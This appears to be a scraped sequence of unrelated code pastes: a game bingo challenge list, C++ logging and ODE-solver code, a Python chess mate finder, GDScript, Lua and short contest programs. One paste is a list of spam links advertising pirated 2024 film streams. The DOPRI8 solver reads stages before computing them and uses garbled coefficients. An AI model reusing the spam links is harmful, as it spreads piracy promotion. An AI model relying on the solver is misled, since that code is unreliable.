  { name: ""Final Haunt Hero w/o Chaos Control"", types: [""finalhaunt"", ""restricted""] },
  { name: ""GUN Fortress Dark via all 7 checkpoints"", types: [""gunfortress"", ""checkpoints""] },
  { name: ""GUN Fortress Hero via all 7 checkpoints"", types: [""gunfortress"", ""checkpoints""] },
  { name: ""Black Comet Dark via all 8 checkpoints"", types: [""blackcomet"", ""checkpoints""] },
  { name: ""Black Comet Hero via all 8 checkpoints"", types: [""blackcomet"", ""checkpoints""] },
  { name: ""Lava Shelter Dark via all 8 checkpoints"", types: [""lavashelter"", ""checkpoints""] },
  { name: ""Lava Shelter Hero via all 8 checkpoints"", types: [""lavashelter"", ""checkpoints""] },
  { name: ""Cosmic Fall Dark via all 7 checkpoints"", types: [""cosmicfall"", ""checkpoints""] },
  { name: ""Cosmic Fall Hero via all 7 checkpoints"", types: [""cosmicfall"", ""checkpoints""] },
  { name: ""Final Haunt Dark via all 8 checkpoints"", types: [""finalhaunt"", ""checkpoints""] },
  { name: ""Final Haunt Hero via all 8 checkpoints"", types: [""finalhaunt"", ""checkpoints""] },
  { name: ""All three Chaotix Missions (Team Combined)"", types: [""and""] },
  { name: ""All four Sonic Missions (Team Combined)"", types: [""and""] },
  { name: ""All 11 Gold Beetles (Team Combined)"", types: [""goldbeetle""] },
  { name: ""Defeat Sonic & Diablon without Guns"", types: [""sonic&diablon"", ""restricted""] },
  { name: ""Defeat Egg Dealer without Guns"", types: [""eggdealer"", ""restricted""] },
  { name: ""Defeat Black Doom without Guns"", types: [""blackdoom"", ""restricted""] },
  { name: ""Unlock The ARK & Cosmic Fall (Team Combined)"", types: [""and""] },
  { name: ""Unlock The Doom & Lost Impact (Team Combined)"", types: [""and""] },
  { name: ""Unlock Black Comet & Final Haunt (Team Combined)"", types: [""and""] },
  { name: ""Unlock Death Ruins & GUN Fortress (Team Combined)"", types: [""and""] },
  { name: ""Unlock Space Gadget & Lava Shelter (Team Combined)"", types: [""and""] },
  { name: ""Unlock Heal Cannon"", types: [""finalhaunt"", ""unlock""] },
  { name: ""Unlock Omochao Gun"", types: [""cosmicfall"", ""unlock""] },
  { name: ""Unlock Satellite Laser"", types: [""gunfortress"", ""unlock""] },
  { name: ""Unlock Egg Vaccuum"", types: [""lavashelter"", ""unlock""] },
  { name: ""Unlock Samurai Blade"", types: [""blackcomet"", ""unlock""] },
  { name: ""Unlock Any Level 2 Weapon"", types: [""and""] },
  { name: ""Ride 7 Unique Vehicles (Team Combined)"", types: [""box""] },
  { name: ""Finish GUN Fortress w/ 250+ Rings"", types: [""gunfortress"", ""box""] },
  { name: ""Hit 3 Life Capsules (GUN Fortress)"", types: [""gunfortress"", ""box""] },
  { name: ""Pacifist Black Comet Hero (3 enemies permitted)"", types: [""blackcomet"", ""restricted""] },
  { name: ""Finish Lava Shelter w/ 92 Shovel Ammo"", types: [""lavashelter"", ""box""] },
  { name: ""Hit 5 Life Capsules (Lava Shelter)"", types: [""lavashelter"", ""box""] },
  { name: ""Lava Shelter Dark without Guns"", types: [""lavashelter"", ""restricted""] },
  { name: ""Finish Cosmic Fall with 200+ Rings"", types: [""cosmicfall"", ""box""] },
  { name: ""Final Haunt Hero w/ 3 Activated Shields"", types: [""finalhaunt"", ""restricted""] },
  { name: ""Destroy 3 Ships in Final Haunt & finish"", types: [""finalhaunt"", ""box""] },
  { name: ""Destroy 6 Ships in Final Haunt & finish"", types: [""finalhaunt"", ""box""] },
  { name: ""The Doom 5 Keys OR Lost Impact Hero"", types: [""or""] },
  { name: ""Mad Matrix Dark OR Space Gadget Neutral"", types: [""or""] },
  { name: ""Lava Shelter 5 Keys OR Prison Island DNH"", types: [""or""] },
  { name: ""Unlock All Stage 2s OR Unlock 2 Stage 6s"", types: [""or""] },
  { name: ""Glyphic Canyon & Black Comet Hero"", types: [""and""] },
  { name: ""Digital Circuit, Death Ruins & GUN Fortress Hero"", types: [""and""] },
  { name: ""Iron Jungle & Lava Shelter Hero"", types: [""and""] },
  { name: ""Circus Park & Air Fleet Hero"", types: [""and""] },
  { name: ""The Doom & Lost Impact Hero"", types: [""and""] },
  { name: ""Cryptic Castle & Mad Matrix Hero"", types: [""and""] },
  { name: ""Iron Jungle & Lava Shelter Dark"", types: [""and""] },
  { name: ""Cryptic Castle & Circus Park Dark"", types: [""and""] }
];

bingoList[3] = hardChallenges;


extraHardChallenges = [
  { name: ""Defeat All 3 Egg Breakers (Team Combined)"", types: [] },
  { name: ""Defeat All 3 Final Bosses (Team Combined)"", types: [] },
  { name: ""Defeat Sonic & Diablon in 3 Different Stages (Team Combined)"", types: [] },
  { name: ""Defeat Egg Dealer in 3 Different Stages (Team Combined)"", types: [] },
  { name: ""Defeat Black Doom in 3 Different Stages (Team Combined)"", types: [] },
  { name: ""70 Keys (Team Combined)"", types: [] },
  { name: ""45 A Ranks (Team Combined)"", types: [] },
  { name: ""Unlock Every Stage (Team Combined)"", types: [] }
];

bingoList[4] = extraHardChallenges;"
kzghpffN,Untitled,Evgen175,C++,Saturday 16th of March 2024 01:08:35 PM CDT,"BOOST_LOG_ATTRIBUTE_KEYWORD(additional_data, ""AdditionalData"", boost::json::value)
BOOST_LOG_ATTRIBUTE_KEYWORD(timestamp, ""TimeStamp"", boost::posix_time::ptime)


using Request = std::string;
using Response = std::string;

class SomeRequestHandler {
public:
    std::string operator()(const std::string& request){
        std::cout << ""HAND REQUEST "" << request << std::endl;
        BOOST_LOG_TRIVIAL(info) << ""sdsdsdsdc "" <<request;
        return request;
    }
};

//----------------------------------------------------------------------

template<class SomeRequestHandler>
class LoggingRequestHandler {
    public:
    LoggingRequestHandler(SomeRequestHandler& handler) : decorated_(handler){}

    Response operator()(Request req) {
        LogRequest(req);
        auto resp = decorated_(std::move(req));
        LogResponse(resp);
        return resp;
    }
    private:
    void LogRequest(const Request& req) {
        std::cout << ""LOG REQUEST "" << req << std::endl;
    }

    void LogResponse(const Response& resp) {
        std::cout << ""Log RESPONSE "" << resp << std::endl;
    }
    SomeRequestHandler& decorated_;
};
"
9dKsyMkL,MenuHandler.gd,Nancok,GDScript,Saturday 16th of March 2024 01:02:04 PM CDT,"extends Node2D
class_name MainMenuHandler

enum Transitions {
	INTERPOLATE,
	FADE_TO
}

const DEFAULT_ANIM_DURATION: float = 0.5


@export var menu_defs: Array[MenuDefinition]


var menu_active: MenuDefinition

var running_tweens: Array[Tween]


func get_view_quadrant(quadrant: Vector2i = Vector2i.ZERO) -> Vector2:
	var output: Vector2 = Vector2(
		get_viewport_rect().size.x * quadrant.x - 1,
		get_viewport_rect().size.y * quadrant.y - 1
	)
	return output

func change_to_menu(menu: MenuDefinition):
	get_viewport().gui_release_focus()
	for tween: Tween in running_tweens:
		if is_instance_valid(tween):
			tween.kill()
	
	
	match menu.transition:
		Transitions.INTERPOLATE:
			anim_interpolate_view(menu.position)
		
		Transitions.FADE_TO:
			anim_fade_move_view(menu.position)

	menu_active = menu
	
	
func anim_interpolate_view(to: Vector2, duration: float = DEFAULT_ANIM_DURATION):
	var tween: Tween = create_tween()
	tween.tween_property(get_viewport(), ""canvas_transform:origin"", to, duration)

func anim_fade_move_view(to: Vector2, duration: float = DEFAULT_ANIM_DURATION):
	var color_rect : = ColorRect.new()

class MenuDefinition extends Node2D:
	var main_node: Node
	var view_pos: Vector2
	var anim_duration: float = DEFAULT_ANIM_DURATION
	var transition: Transitions

	func _init(_main_node: Node):
		main_node
"
Z29fnkeS,new_ode,maxim_shlyahtin,C++,Saturday 16th of March 2024 12:25:19 PM CDT,"#include <cmath>
#include <cstdio>
#include <iostream>
#include <vector>
#include <chrono>

class RungeKutta {
protected:
    double t;
    std::vector<double> X, XH, K1, K2, K3, K4, FX;

public:
    RungeKutta(uint32_t N) {
        Init(N);
    }

    double getX(uint32_t index) {
        return X.at(index);
    }

    void Init(uint32_t N) {
        X.resize(N);
        XH.resize(N);
        K1.resize(N);
        K2.resize(N);
        K3.resize(N);
        K4.resize(N);
        FX.resize(N);
    }

    void SetInit(double t0, std::vector<double> X0) {
        t = t0;
        if (X.empty()) Init(X0.size());
        for (size_t i = 0; i < X.size(); i++)
            X[i] = X0[i];
    }

    virtual std::vector<double> F(double t, std::vector<double> X) = 0;

    void NextStep(double h) {
        if (h < 0) return;

        K1 = F(t, X);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K1[i] * (h / 2.0);

        K2 = F(t + h / 2.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K2[i] * (h / 2.0);

        K3 = F(t + h / 2.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K3[i] * h;

        K4 = F(t + h, XH);

        for (size_t i = 0; i < X.size(); i++)
            X[i] = X[i] + h / 6.0 * (K1[i] + 2.0 * K2[i] + 2.0 * K3[i] + K4[i]);

        t = t + h;
    }
};

class DOPRI8 {
protected:
    double t;
    std::vector<double> X, XH, K1, K2, K3, K4, K5, K6,
        K7, K8, K9, K10, K11, K12, K13, FX;

public:
    DOPRI8(uint32_t N) {
        Init(N);
    }

    double getX(uint32_t index) {
        return X.at(index);
    }

    void Init(uint32_t N) {
        X.resize(N);
        XH.resize(N);
        K1.resize(N);
        K2.resize(N);
        K3.resize(N);
        K4.resize(N);
        K5.resize(N);
        K6.resize(N);
        K7.resize(N);
        K8.resize(N);
        K9.resize(N);
        K10.resize(N);
        K11.resize(N);
        K12.resize(N);
        K13.resize(N);
        FX.resize(N);
    }

    void SetInit(double t0, std::vector<double> X0) {
        t = t0;
        if (X.empty()) Init(X0.size());
        for (size_t i = 0; i < X.size(); i++)
            X[i] = X0[i];
    }

    virtual std::vector<double> F(double t, std::vector<double> X) = 0;

    void NextStep(double h) {
        if (h < 0) return;

        K1 = F(t + h, X);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K1[i] * (h / 18.0);

        K2 = F(t + h / 18.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K2[i] * (h / 48.0 + h / 16.0);

        K3 = F(t + h / 48.0 + h / 16.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K3[i] * (h / 32.0 + 3 * h / 32.0);

        K4 = F(t + h / 32.0 + 3 * h / 32.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K4[i] * (5 * h / 16.0 - 75.0 * h / 64.0 + 75.0 * h / 64.0);

        K5 = F(t + 5 * h / 16.0 - 75.0 * h / 64.0 + 75.0 * h / 64.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K5[i] * (3 * h / 80.0 + 3.0 * h / 16.0 + 3.0 * h / 20.0);

        K6 = F(t + 3 * h / 80.0 + 3.0 * h / 16.0 + 3.0 * h / 20.0, XH);

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K7[i] * (29443841.0 * h / 614563906.0 +
                77736538.0 * h / 77736538.0 - 28693883.0 * h / 1125000000.0 + 23124283.0 * h / 1800000000.0);

        K7 = F(t + 29443841.0 * h / 614563906.0 +
            77736538.0 * h / 77736538.0 - 28693883.0 * h / 1125000000.0 + 23124283.0 * h / 1800000000.0, XH);

        std::vector<double> T1 = { 16016141.0 / 946692911.0, 0.0, 0.0, 61564180.0 / 158732637.0, 22789713.0 / 633445777.0, 545815736.0 / 2771057229.0, -180193667.0 / 1043307555.0 };

        double t1 = 0.0;
        for (const auto& num : T1)
            t1 += h * num;

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K8[i] * t1;

        K8 = F(t + t1, XH);

        std::vector<double> T2 = { 39632708.0 / 573591083.0, 0.0, 0.0, -433636366.0 / 683701615.0, -421739975.0 / 2616292301.0, 100302831.0 / 723423059.0, 790204164.0 / 839813087.0, 800635310.0 / 3783071287.0 };

        double t2 = 0.0;
        for (const auto& num : T2)
            t2 += h * num;

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K9[i] * t2;

        K9 = F(t + t2, XH);

        std::vector<double> T3 = { 246121993.0 / 1340847787.0, 0.0, 0.0, -37695042795.0 / 15268766246.0, -309121744.0 / 1061227803.0, -12992083.0 / 490766935.0, 6005943493.0 / 2108947869.0, 393006217.0 / 1396673457.0, 123872331.0 / 1001029789.0 };

        double t3 = 0.0;
        for (const auto& num : T3)
            t3 += h * num;

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K10[i] * t3;

        K10 = F(t + t3, XH);

        std::vector<double> T4 = { -1028468189.0 / 846180014.0, 0.0, 0.0, 8478235783.0 / 508512852.0, 1311729495.0 / 1432422823.0, -10304129995.0 / 1701304382.0, -48777925059.0 / 3047939560.0, 15336726248.0 / 1032824649.0, -45442868181.0 / 3398467696.0, 3065993473.0 / 597172653.0 };

        double t4 = 0.0;
        for (const auto& num : T4)
            t4 += h * num;

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K11[i] * t4;

        K11 = F(t + t4, XH);

        std::vector<double> T5 = { 185892177.0 / 718116043.0, 0.0, 0.0, -3185094517.0 / 667107341.0, -477755414.0 / 1098053517.0, -703635378.0 / 230739211.0, 5731566787.0 / 1027545527.0, 5232866602.0 / 850066563.0, -4093664535.0 / 808688257.0, 3962137247.0 / 1805957418.0, 65686358.0 / 487910083.0 };

        double t5 = 0.0;
        for (const auto& num : T5)
            t5 += h * num;

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K12[i] * t5;

        K12 = F(t + t5, XH);

        std::vector<double> T6 = { 403863854.0 / 491063109.0, 0.0, 0.0, -5068492393.0 / 434740067.0, -411421997.0 / 543043805.0, 652783627.0 / 914296604.0, 11173962825.0 / 925320556.0, -13158990841.0 / 6184727034.0, 3936647629.0 / 1978049680.0, -160528059.0 / 685178525.0, 248638103.0 / 1413531060.0, 0.0 };

        double t6 = 0.0;
        for (const auto& num : T6)
            t6 += h * num;

        for (size_t i = 0; i < X.size(); i++)
            XH[i] = X[i] + K13[i] * t6;

        K13 = F(t + t6, XH);

        std::vector<double> Tb = { 14005451.0 / 335480064.0, 0.0, 0.0, 0.0, 0.0, -59238493.0 / 1068277825.0, 181606767.0 / 758867731.0, 561292985.0 / 797845732.0, -1041891430.0 / 1371343529.0, 760417239.0 / 1151165299.0, 118820643.0 / 751138087.0, -528747749.0 / 2220607170.0, 1.0 / 4.0 };

        for (size_t i = 0; i < X.size(); i++)
            X[i] = X[i] + h * (K1[i] * Tb[0] + K2[i] * Tb[1] + K3[i] * Tb[2] + K4[i] * Tb[3] + K5[i] * Tb[4] + K6[i] * Tb[5] + K7[i] * Tb[6] + K8[i] * Tb[7] + K9[i] * Tb[8] + K10[i] * Tb[9] + K11[i] * Tb[10] + K12[i] * Tb[11] + K13[i] * Tb[12]);

        t = t + h;
    }
};

class TA : public DOPRI8 {
private:

    const double b = 0.15; // bifurcation parameter

public:
    TA(uint32_t N) : DOPRI8(N) {}

    std::vector<double> F(double h, std::vector<double> X) override {
        FX[0] = sin(X[1]) - b * X[0];
        FX[1] = sin(X[2]) - b * X[1];
        FX[2] = sin(X[0]) - b * X[2];
        return FX;
    }

    static void Test() {
        double dt = 0.001;
        TA task(3);
        int n = 0;
        std::vector<double> X0 = { 0, 1, 0 };
        task.SetInit(0, X0);
        while (n < 20000) {
            n++;
            std::cout << n <<"" Time = "" << task.t << ""; x = "" << task.X[0] << ""; y = "" << task.X[1] << ""; z = "" << task.X[2] << '\n';
            task.NextStep(dt);
        }
    }
};



int main() {
    auto start = std::chrono::steady_clock::now();
    TA::Test();
    auto end = std::chrono::steady_clock::now();
    std::cout << ""time "" << std::chrono::duration_cast<std::chrono::seconds>(end - start).count() << "" sec\n"";
    return 0;
}"
0jK3VRCJ,quite good moves_to_mate 14 but is 10,max2201111,Python,Saturday 16th of March 2024 12:22:28 PM CDT,"import chess

def simplify_fen(fen):
    """"""Simplifies a FEN string to include only position, turn, castling availability, and en passant target.""""""
    return ' '.join(fen.split(' ')[:4])

def initialize_game_tree(initial_fen):
    """"""Initializes the game tree with the root node based on the initial FEN.""""""
    simplified_fen = simplify_fen(initial_fen)
    game_tree = {1: {'fen': simplified_fen, 'parent': None, 'color': chess.WHITE if 'w' in initial_fen else chess.BLACK, 'children': [], 'moves_to_mate': None}}
    fen_to_node_id = {simplified_fen: 1}
    return game_tree, fen_to_node_id

def add_descendants_iteratively(game_tree, fen_to_node_id):
    """"""Expands the game tree by iteratively adding legal move descendants of each game state.""""""
    queue = [(1, 0)]
    while queue:
        node_id, _ = queue.pop(0)
        board = chess.Board(game_tree[node_id]['fen'] + "" 0 1"")
        for move in board.legal_moves:
            board.push(move)
            simplified_fen = simplify_fen(board.fen())
            if simplified_fen not in fen_to_node_id:
                new_node_id = len(game_tree) + 1
                game_tree[new_node_id] = {'fen': simplified_fen, 'parent': node_id, 'color': chess.WHITE if board.turn else chess.BLACK, 'children': [], 'moves_to_mate': None}
                fen_to_node_id[simplified_fen] = new_node_id
                game_tree[node_id]['children'].append(new_node_id)
                queue.append((new_node_id, 0))
            board.pop()

def update_game_outcomes(game_tree):
    """"""Updates game outcomes focusing only on checkmates.""""""
    for node_id, node in game_tree.items():
        board = chess.Board(node['fen'] + "" 0 1"")
        if board.is_checkmate():
            node['result'] = 1 if board.turn == chess.BLACK else -1  # Black's turn but checkmate means White wins, and vice versa
            node['moves_to_mate'] = 0  # Checkmate is immediate, no more moves required.
        elif board.is_game_over():
            node['result'] = 0  # For draws or stalemates, we consider the result as 0 (this will be ignored in propagation)

# def update_parent_preferences(game_tree):
#     """"""Propagates the best outcome for each node up the game tree, prioritizing checkmates and updating moves to mate.""""""
#     def recurse(node_id):
#         node = game_tree[node_id]
#         if 'result' in node and node['result'] in [-1, 1]:  # Checkmate detected
#             return node['result'], [node_id], 0 if 'moves_to_mate' in node else None

#         best_result = None
#         best_path = []
#         best_moves_to_mate = None
#         for child_id in node['children']:
#             child_result, child_path, child_moves_to_mate = recurse(child_id)
            
#             if child_moves_to_mate is not None:
#                 child_moves_to_mate += 1  # Increment moves to mate since we move up the tree
                
#                 if best_moves_to_mate is None or (node['color'] == chess.WHITE and child_result == 1 and child_moves_to_mate < best_moves_to_mate) or (node['color'] == chess.BLACK and child_result == -1 and child_moves_to_mate > best_moves_to_mate):
#                     best_result, best_path, best_moves_to_mate = child_result, child_path, child_moves_to_mate

#         if best_result in [-1, 1]:
#             node['result'] = best_result
#             node['moves_to_mate'] = best_moves_to_mate
#         else:
#             node['result'] = 0  # Default to draw if no win/loss is found

#         return node.get('result', 0), [node_id] + best_path, node.get('moves_to_mate', None)

#     result, path, moves_to_mate = recurse(1)  # Start the recursion from the root node.
#     return path

def update_parent_preferences(game_tree):
    """"""Updates the parent preferences for each node up the game tree, prioritizing checkmates.""""""
    def recurse(node_id):
        node = game_tree[node_id]
        if 'result' in node and node['result'] in [-1, 1]:  # Direct checkmate detected
            return node['result'], [node_id], 0

        best_result = None
        best_path = []
        # Initialize moves_to_mate with a large number for comparison
        best_moves_to_mate = float('inf') if node['color'] == chess.WHITE else -float('inf')

        for child_id in node['children']:
            child_result, child_path, child_moves_to_mate = recurse(child_id)

            # Update for WHITE (minimizing moves to mate) or BLACK (maximizing moves to mate)
            if child_moves_to_mate is not None:
                updated = False
                if node['color'] == chess.WHITE and child_result == 1:
                    if best_moves_to_mate > child_moves_to_mate:
                        best_moves_to_mate = child_moves_to_mate
                        updated = True
                elif node['color'] == chess.BLACK and child_result == -1:
                    if best_moves_to_mate < child_moves_to_mate:
                        best_moves_to_mate = child_moves_to_mate
                        updated = True

                if updated:
                    best_result = child_result
                    best_path = child_path

        # If no checkmate path was found, revert moves_to_mate to None and set result to draw
        if best_moves_to_mate == float('inf') or best_moves_to_mate == -float('inf'):
            best_moves_to_mate = None
            best_result = 0

        if best_result in [-1, 1]:
            node['moves_to_mate'] = best_moves_to_mate + 1 if best_moves_to_mate is not None else None
        else:
            node['result'] = 0  # Default to draw if no win/loss is found
            node['moves_to_mate'] = None

        return best_result, [node_id] + best_path, node.get('moves_to_mate')

    # Execute the recursive function starting from the root node.
    result, path, moves_to_mate = recurse(1)
    return path

# Ensure you call this function in your main to see the corrected output.


def print_path(game_tree, path):
    """"""Prints the board positions along the path.""""""
    for node_id in path:
        node = game_tree[node_id]
        board = chess.Board(node['fen'] + "" 0 1"")
        moves_to_mate = ""N/A"" if node.get('moves_to_mate') is None else node.get('moves_to_mate')
        print(f""Node ID: {node_id}, Result: {node.get('result', 'N/A')}, Moves to Mate: {moves_to_mate}"")
        print(board)
        print(""---"")

def main():
    initial_fen = ""8/8/8/3k4/8/8/2K2Q2/8 w - - 0 1""  # Example FEN
    initial_fen = ""8/8/8/3k4/8/2K5/5q2/8 w - - 0 1""

    game_tree, fen_to_node_id = initialize_game_tree(initial_fen)
    add_descendants_iteratively(game_tree, fen_to_node_id)
    update_game_outcomes(game_tree)
    path = update_parent_preferences(game_tree)
    print(game_tree[1])
    print(""Path to the outcome:"")
    print_path(game_tree, path)

if __name__ == ""__main__"":
    main()
"
LNW9QkpM,reverse a string,BojidarDosev,C++,Saturday 16th of March 2024 11:58:31 AM CDT,"#include <iostream>
#include <vector>
#include <string>
#include <cmath>
#include <algorithm>

using namespace std;

int main()
{
	string str = ""I am Bozhidar dosev."";
	vector<char> data(str.begin(),str.end());
	int a = 0;
	

	for (int i = str.length()-1; i >-1.; i--)
	{
		cout << data[i];
	}
}"
vjgwTPzP,Untitled,Josif_tepe,C++,Saturday 16th of March 2024 11:55:06 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;

int main() {
    int a, b;
    cin >> a >> b;
    int res = 0;
    while(a != b) {
        if(a > b) {
            swap(a, b);
        }
        int koren = sqrt(a);
        int najgolem_delitel = 1;
        for(int i = 2; i <= koren; i++) {
            if(a % i == 0) {
                najgolem_delitel = a / i;
                break;
            }
        }
        int razlika = b - a;
        int kolku_pati = razlika / najgolem_delitel;
        if(razlika % najgolem_delitel > 0) {
            kolku_pati++;
        }
        b -= kolku_pati * najgolem_delitel;
        
        res += kolku_pati;
    }
    cout << res << endl;
    return 0;
}
"
13qV8Tyv,safdvsaerbr,gadungw71,PHP,Saturday 16th of March 2024 11:48:11 AM CDT,"https://techcommunity.microsoft.com/t5/community-events-list/%E5%9C%A8%E7%BA%BF%E8%A7%82%E7%9C%8B-%E6%B2%99%E4%B8%982-2024-%E5%AE%8C%E6%95%B4%E7%89%88-%E9%9B%BB%E5%BD%B1%E2%84%8D%F0%9D%94%BB/m-p/4087292
https://techcommunity.microsoft.com/t5/community-events-list/%E6%B2%99%E4%B8%982-2024-%E5%AE%8C%E6%95%B4%E7%89%88%E6%9C%AC-hd-bd1080p-%E5%85%8D%E8%B2%BB%E4%B8%8B%E8%BC%89-hd/m-p/4087299
https://github.com/2024-EXHUMA-TW
https://github.com/Exhuma-TW-HK
https://github.com/2024-CHINESE-HD-1080P
https://techcommunity.microsoft.com/t5/community-events-list/%E7%A0%B4%E5%A2%93-%E5%AE%8C%E6%95%B4%E7%89%88%E6%9C%AC-2024-%E9%AB%98%E6%B8%85%E7%94%B5%E5%BD%B1-1080p-%E5%AE%8C%E6%95%B4%E7%9A%84%E7%94%B5%E5%BD%B1/m-p/4087324
https://techcommunity.microsoft.com/t5/community-events-list/%E7%A0%B4%E5%A2%93-%E5%AE%8C%E6%95%B4%E7%89%88-2024-%E9%AB%98%E6%B8%85%E7%94%B5%E5%BD%B1-tw-hk-%E5%AE%8C%E6%95%B4%E7%9A%84%E7%94%B5%E5%BD%B1/m-p/4087328
https://techcommunity.microsoft.com/t5/community-events-list/%E7%BA%BF%E4%B8%8A%E7%9C%8B%E5%AE%8C%E6%95%B4%E7%89%88-%E7%A0%B4%E5%A2%93-exhuma-2024-hd%E9%AB%98%E6%B8%85%E7%94%B5%E5%BD%B1/m-p/4087401
https://techcommunity.microsoft.com/t5/community-events-list/%E6%8C%91%E6%88%98-%E5%AE%8C%E6%95%B4%E7%89%88-challenge-%E7%94%B5%E5%BD%B1%E5%AE%8C%E6%95%B4%E7%89%88%E5%AE%8C%E6%95%B4%E7%89%88-2024tw/m-p/4087439
https://techcommunity.microsoft.com/t5/community-events-list/%E5%9C%A8%E7%BA%BF%E8%A7%82%E7%9C%8B-%E6%8C%91%E6%88%98-2024-%E5%AE%8C%E6%95%B4%E7%89%88-%E9%9B%BB%E5%BD%B1%E2%84%8D%F0%9D%94%BB/m-p/4087440
https://techcommunity.microsoft.com/t5/community-events-list/full-%CA%9C%E1%B4%85-xem-phim-exhuma-qu%E1%BA%ADt-m%E1%BB%99-tr%C3%B9ng-ma-2024-vietsub-phimmoi/m-p/4087447
https://techcommunity.microsoft.com/t5/community-events-list/xem-phim-exhuma-qu%E1%BA%ADt-m%E1%BB%99-tr%C3%B9ng-ma-2024-full-4k-vietsub-thuyet-min/m-p/4087453
https://github.com/Xem-Phim-Qu-t-M-Trung-Ma-VietSub-4k
https://github.com/phimExhumaQu-tM-TrungMaFullHD4KVietsub
https://techcommunity.microsoft.com/t5/community-events-list/xem-phim-exhuma-qu%E1%BA%ADt-m%E1%BB%99-tr%C3%B9ng-ma-2024-vietsub-full-hd-phimmoi/m-p/4087460
https://techcommunity.microsoft.com/t5/community-events-list/phim-exhuma-qu%E1%BA%ADt-m%E1%BB%99-tr%C3%B9ng-ma-2024-full-hd-visub-4k-ultra-hd/m-p/4087461
https://techcommunity.microsoft.com/t5/community-events-list/full-%CA%9C%E1%B4%85-xem-phim-qu%E1%BB%B7-c%E1%BA%A9u-2024-vietsub-phimmoi/m-p/4087467
https://techcommunity.microsoft.com/t5/community-events-list/xem-phim-qu%E1%BB%B7-c%E1%BA%A9u-2024-vietsub-full-hd-m%E1%BB%9Bi-online/m-p/4087473
https://github.com/Xem-phim-Qu-C-u-2024-Full-HD
https://github.com/Xem-Phim-Qu-C-u-2024-Full-HD-Mi-n-Phi
https://techcommunity.microsoft.com/t5/community-events-list/xem-phim-mai-2024-vietsub-full-hd-phimmoi/m-p/4087486
https://techcommunity.microsoft.com/t5/community-events-list/xem-phim-mai-2024-full-hd-online/m-p/4087489
https://github.com/Xem-Phim-Mai-2024-Vi-tsub-FULL-4K
https://github.com/Xem-Phim-MAI-2024-FULL-Vietsub-4k
https://github.com/Xem-Phim-Kung-Fu-Panda-4-2024-Online-HD
https://github.com/Xem-phim-Kung-Fu-Panda-4-Vietsub-FULL
https://wandering.flarum.cloud/d/49541-masalampau
https://click4r.com/posts/g/15139247/jurgen-klopp-beware-of-rasmus-hojlund-s-return
https://forum.webnovel.com/d/169852-manchester-united-vs-liverpool-jurgen-klopp-beware-of-rasmus-hojlunds-return
https://hiuderyy.hashnode.dev/jurgen-klopp-beware-of-rasmus-hojlunds-return
https://dojour.us/e/24550-sfresbdryntuy
https://open.firstory.me/story/cltub98or0b4001uu4oju2n65
https://telegra.ph/Manchester-United-vs-Liverpool-03-16
https://paste.ee/p/Y7BLE
https://start.me/w/XLjz1y
https://hackmd.io/@rerewilli6/SJTDjHQRp
https://muckrack.com/aswrdev-turu/bio
https://profile.hatena.ne.jp/afafaw/
https://www.fitlynk.com/4e2d0003d
"
D5GG0ZVW,Untitled,Josif_tepe,C++,Saturday 16th of March 2024 11:34:17 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int a, b, c;
    cin >> a >> b >> c;
    
    int pomosna = 0;
    if(a >= 5) {
        pomosna += 5;
        a -= 5;
    }
    else {
        pomosna += a;
        a = 0;
    }
    if(b >= 5) {
        pomosna += 5;
        b -= 5;
    }
    else {
        pomosna += b;
        b = 0;
    }
    if(c >= 5) {
        pomosna += 5;
        c -= 5;
    }
    else {
        pomosna += c;
        c = 0;
    }
    if(abs(a - b) <= pomosna or abs(a - c) <= pomosna or abs(b - c) <= pomosna) {
        cout << ""DA"" << endl;
    }
    else {
        cout << ""NE"" << endl;
    }
    return 0;
}
"
1k0WLPRE,Untitled,TheStraying11,Lua,Saturday 16th of March 2024 11:30:37 AM CDT,"local real = rednet.receive
local function make_lut(t)
	local o = {}
	for k, v in pairs(t) do o[v] = true end
	return o
end
function rednet.receive(filter, timeout)
	local id, msg, protocol
	if type(filter) == 'table' then
	local lut = make_lut(filter)
	repeat
		id, msg, protocol = real(nil, timeout)
	until lut[protocol]
	else
	id, msg, protocol = real(filter, timeout)
	end
	return id, msg, protocol
end

local fns = {}

function fns.place(msg)
	local success = turtle.place()
	rednet.broadcast(tostring(success), 'return')
end

function fns.dig(msg)
	local success = turtle.dig()
	rednet.broadcast(tostring(success), 'return')
end

rednet.open('back')
while true do
	local id, msg, protocol = rednet.receive({'place', 'dig'})
	fns[protocol](msg)
end
"
sL0Fm6jA,Untitled,Josif_tepe,C++,Saturday 16th of March 2024 11:21:12 AM CDT,"#include <iostream>
using namespace std;

int main() {
    int x;
    cin >> x;
    
    int rezultat = 2e9;
    for(int d = 0; d <= x; d++) {
        int drvena = 5 * d;
        if(drvena >= x) {
            if(rezultat > d) {
                rezultat = d;
            }
        }
        if(drvena <= x) {
            int metalna = (x - drvena) / 10;
            if((x - drvena) % 10 > 0) {
                metalna++;
            }
            if(metalna <= d and drvena + 10 * metalna >= x) {
                if(rezultat > d + metalna) {
                    rezultat = d + metalna;
                    
                }
            }
        }
        
    }
    cout << rezultat << endl;
    return 0;
}
"
